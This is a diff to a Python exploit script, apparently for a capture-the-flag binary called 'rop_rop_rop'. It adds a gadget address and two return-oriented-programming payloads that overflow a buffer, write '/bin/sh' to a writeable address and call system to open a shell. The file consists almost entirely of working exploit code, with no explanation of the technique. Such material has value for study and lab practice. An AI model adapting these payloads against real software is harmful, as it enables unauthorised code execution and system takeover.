@@ -4,6 +4,8 @@ import struct
 # ROPgadget --binary rop_rop_rop
 # 0x0804841a : add esp, 8 ; pop ebx ; ret
 PPP_RET = 0x0804841a
+# 0x0804841d : pop ebx ; ret
+P_RET = 0x0804841d
 
 
 def pack(list):
@@ -43,9 +45,50 @@ payload1 = pack([
 
     0x0000000a,  # terminal code
 
-    'whoami\n',  # shellcode
+    'whoami\n',  # command
 ])
 
 
+WRITEABLE = 0x0804A04C
+
+
+payload2 = pack([
+    b'\x00BCD'
+    b'EFGH'
+    b'IJKL'
+    b'MNOP',
+
+    0x080485F2,     # GetUserInput(char *dest)
+    P_RET,          # pop ret
+    WRITEABLE,      # writeable
+
+    0x08048480,     # system_addr
+    P_RET,
+    WRITEABLE,
+
+    '\n',           # terminal code
+
+    '/bin/sh\n',     # command
+])
+
+
+payload3 = pack([
+    b'\x00BCD'
+    b'EFGH'
+    b'IJKL'
+    b'MNOP',
+
+    0x080485F2,     # GetUserInput(char *dest)
+    0x08048480,     # system_addr
+    WRITEABLE,      # writeable
+    WRITEABLE,
+
+    '\n',           # terminal code
+
+    '/bin/sh\n',    # command
+])
+
 if __name__ == '__main__':
     print(payload1)
+    print(payload2)
+    print(payload3)
